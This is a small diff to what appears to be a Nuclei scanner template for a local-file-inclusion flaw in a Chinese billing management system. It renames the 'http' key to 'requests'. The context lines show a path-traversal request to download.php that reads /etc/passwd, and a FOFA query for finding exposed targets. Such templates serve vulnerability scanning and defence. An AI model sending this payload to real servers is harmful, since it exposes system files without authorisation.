@@ -15,7 +15,7 @@ info:
     fofa-query: title="蓝海卓越计费管理系统"
   tags: natshell,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/download.php?file=../../../../../etc/passwd"
